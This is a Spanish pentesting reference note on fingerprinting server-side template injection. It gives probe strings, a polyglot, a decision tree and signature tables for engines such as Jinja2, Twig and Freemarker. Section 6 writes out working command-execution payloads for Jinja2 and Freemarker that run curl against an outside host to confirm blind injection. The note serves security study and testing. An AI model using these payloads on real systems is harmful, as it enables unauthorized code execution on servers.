---
tipo: meta
aliases:
  - identificar motor de plantillas
  - SSTI polyglot
tags:
  - meta/referencia
  - dominio/web
---

# SSTI - matriz de identificación

> [!info] Referencia pura, no un zettel
> Confirmar la inyección y averiguar qué motor es. Los payloads por motor están en [[SSTI payloads - matriz de referencia]]; el criterio, en [[MOC - SSTI]].

Identificar va **antes** que cualquier payload. Cuatro peticiones bien elegidas resuelven el motor; tirar payloads a ciegas gasta veinte y ensucia el registro de errores.

## 1. ¿Hay evaluación?

`{{7*7}}`
`${7*7}`
`#{7*7}`
`<%= 7*7 %>`
`{7*7}`
`*{7*7}`
`@(7*7)`

Devuelve `49` → hay evaluación del lado del servidor. Devuelve `{{7*7}}` literal → no hay SSTI por ese delimitador; probar los otros antes de descartar.

> [!warning] `49` en el navegador no es lo mismo que `49` en la respuesta
> Mirar el cuerpo **crudo**, no el DOM. Si por HTTP viene `{{7*7}}` literal y en la página se ve `49`, el motor corre en el navegador: es [[SSTI - del lado del cliente]] y el dominio cambia.

`curl -s 'https://objetivo/?q={{7*7}}' | grep -o '49'`

## 2. Distinguir de XSS

Los dos empiezan con entrada reflejada. La prueba que los separa es aritmética, no una etiqueta:

| Prueba | Vuelve | Qué es |
|---|---|---|
| `{{7*7}}` | `49` | SSTI |
| `{{7*7}}` | literal | No hay evaluación |
| `<b>x</b>` | negrita | Hay inyección de HTML — [[MOC - Cross-site scripting]] |
| `${7*7}` | `49` | SSTI con otro delimitador |

Que haya XSS **no** descarta SSTI: pueden convivir en el mismo parámetro y el impacto de uno es mucho mayor que el del otro.

## 3. El polyglot

`${{<%[%'"}}%\`

No ejecuta nada: **rompe** todos los motores a la vez. La excepción que devuelve trae casi siempre el nombre del motor y a veces la traza entera.

Es la petición más rentable del dominio: una sola, y el mensaje de error identifica lo que de otro modo cuesta cuatro pruebas.

`{{7*'7'}}`
Discrimina entre los dos motores más parecidos: Jinja2 devuelve `7777777` (Python multiplica cadenas), Twig devuelve `49`.

## 4. Árbol de identificación

```
${7*7} → 49
├─ ${"z".join("ab")} → error  → Java: Freemarker, Velocity, Thymeleaf
│  ├─ #set($x=1) reconocido    → Velocity
│  ├─ <#assign x=1> reconocido → Freemarker
│  └─ __${T(java.lang.Runtime)} → Thymeleaf / Spring EL
└─ ${7*'7'} → 49               → Smarty, o EL genérico

{{7*7}} → 49
├─ {{7*'7'}} → 7777777         → Jinja2  (Python)
├─ {{7*'7'}} → 49              → Twig    (PHP)
├─ {{7|string}} funciona       → Jinja2 confirmado
└─ nada del servidor, sí en el DOM → AngularJS / Vue → [[SSTI - del lado del cliente]]

<%= 7*7 %> → 49                → ERB (Ruby) o EJS (Node)
#{7*7} → 49                    → Pug (Node) o Ruby interpolado
{7*7} → 49                     → Smarty antiguo
```

## 5. Firmas por motor

| Motor | Lenguaje | Delimitador | Prueba que lo confirma | Entorno restringido |
|---|---|---|---|---|
| Jinja2 | Python | `{{ }}` | `{{7*'7'}}` → `7777777` | **Sí** |
| Twig | PHP | `{{ }}` | `{{7*'7'}}` → `49` | Sí, débil |
| Freemarker | Java | `${ }` | `<#assign x=1>` | No |
| Velocity | Java | `$` `#` | `#set($x=1)` | No |
| Thymeleaf | Java | `[[ ]]` `${ }` | `__${...}__::.x` | Parcial |
| Smarty | PHP | `{ }` | `{$smarty.version}` | Configurable |
| ERB | Ruby | `<%= %>` | `<%= 7*7 %>` | No |
| Pug | Node | `#{ }` | `#{7*7}` | No |
| Handlebars | Node | `{{ }}` | Sin lógica: `{{7*7}}` **no** evalúa | Sin lógica |
| Mako | Python | `${ }` | `${7*7}` con `<% %>` | No |
| Nunjucks | Node | `{{ }}` | `{{7*'7'}}` → `NaN` | Sí |

Handlebars es el caso que confunde: usa `{{ }}` como Jinja2 y **no evalúa expresiones**. Si `{{7*7}}` vuelve literal pero `{{nombre}}` sí se sustituye, es un motor sin lógica y la rama es [[SSTI - lectura sin ejecución]].

## 6. Cuando no se refleja

Si la entrada se renderiza en un correo, un informe o un proceso en segundo plano, no hay respuesta que mirar. Se identifica por canal fuera de banda, igual que en [[Command injection - canal fuera de banda]]:

`{{ lipsum.__globals__['os'].popen('curl http://mi-host/'+'jinja').read() }}`
`<#assign e="freemarker.template.utility.Execute"?new()>${e("curl http://mi-host/freemarker")}`

Un identificador distinto por motor en la URL, y el que llegue dice cuál era. Cuesta una petición por motor y es la única forma en el caso ciego.

## 7. Ubicar la inyección

Confirmado el motor, falta saber si la entrada **es** la plantilla o está dentro de una expresión:

| Prueba | Qué significa |
|---|---|
| `{{7*7}}` evalúa | La entrada es la plantilla. Payload directo |
| `{{7*7}}` literal, `}}{{7*7}}` evalúa | Estás dentro de una expresión: hay que cerrarla primero |
| Solo evalúa sin llaves | La entrada ya está dentro de `{{ }}` en la plantilla original |

El segundo caso es el equivalente a la ruptura del contexto en [[MOC - Command injection]]: cambia el prefijo del payload, no la técnica.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El payload vuelve literal | Delimitador equivocado, o no hay evaluación. Probar los siete de § 1 |
| `49` en el DOM y no en el cuerpo | Motor del lado del cliente |
| Error de sintaxis con el nombre del motor | El polyglot funcionó. Ya está identificado |
| `{{7*7}}` literal pero `{{nombre}}` sustituye | Motor sin lógica. No hay ejecución posible |
| `500` sin cuerpo | Los errores están suprimidos. Identificar por canal fuera de banda |
| Funciona en un parámetro y no en otro | Solo uno construye la plantilla. Es lo normal |
| `7777777` con Twig esperado | Es Jinja2. Reidentificar antes de seguir |

## Relacionadas

[[MOC - SSTI]] · [[SSTI payloads - matriz de referencia]] · [[CWE-1336 - Improper Neutralization of Special Elements Used in a Template Engine]] · [[XSS contextos - matriz de referencia]]
